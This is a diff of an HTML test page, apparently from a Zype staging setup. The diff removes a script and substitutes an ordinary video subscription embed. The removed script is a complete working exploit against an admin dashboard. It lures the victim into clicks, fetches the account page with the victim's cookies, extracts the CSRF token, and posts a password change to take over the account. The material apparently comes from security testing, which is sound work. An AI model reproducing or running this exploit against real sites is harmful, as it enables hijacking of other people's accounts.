@@ -4,41 +4,8 @@
 <meta charset='utf-8' />
 </head>
 <body>
-<script>
-      let url = 'https://admin-dash-1353-b.working.k.zype.com/manage_account/edit';
-              document.write('1. Click anywhere on the window<br>2. When a new window opens, click anywhere there too');
-        window.onclick = i => {
-          const w = window.open(url,'_blank');
-          setTimeout(x=>w.close(),5000);
-          window.onclick = null;
-        }
-        setTimeout(exploit, 5000);
-            async function exploit() {
-        // fetch CSRF Token
-        const resp = await fetch('https://admin-dash-1353-b.working.k.zype.com/manage_account/edit',{mode: 'cors',credentials: 'include'});
-        const data = await resp.text();
-
-        const parser = new DOMParser();
-        const htmlDoc = parser.parseFromString(data, "text/html");
-
-        csrfToken = htmlDoc.querySelector('meta[name="csrf-token"]').content;
-        current_site_attributes = htmlDoc.querySelector('input[name="user[current_site_attributes][id]"]').value;
-
-        // change user's password
-        const pwd = escape("");
-        const params = `utf8=%E2%9C%93&_method=patch&authenticity_token=${encodeURIComponent(csrfToken)}&user%5Bpassword%5D=${pwd}&user%5Bpassword_confirmation%5D=${pwd}&user%5Bcurrent_site_attributes%5D%5Bid%5D=${current_site_attributes}&anchor=account-security`
-        console.log(params);
-
-        fetch('https://admin-dash-1353-b.working.k.zype.com/manage_account',{
-          method: 'POST',
-          credentials: 'include',
-          headers: {
-            'Content-type': 'application/x-www-form-urlencoded'
-          },
-          //redirect: 'error',
-          body: params
-        });
-      }
-    </script>
+      <h1>Embedded Subs</h1>
+      <div id="zype_647f8f3315ed6f00014f0615" style="width:100%; min-width:300px; max-width:560px;"></div>
+      <script src="https://play-staging.working.k.zype.com/javascripts/subscription_embed.js" type="text/javascript"></script><script type="text/javascript">zype.siteId = "ZFua-wSm3Fr5Ptd2Mr_Qq9Cgt5RGunrxEoDtHyG2HmRg72roy0z6kz7O7JJvEnme";zype.host = "https://play-staging.working.k.zype.com";zype.videoId = "647f8f3315ed6f00014f0615";zype.videoEmbed("zype_647f8f3315ed6f00014f0615");</script>
 </body>
 </html>
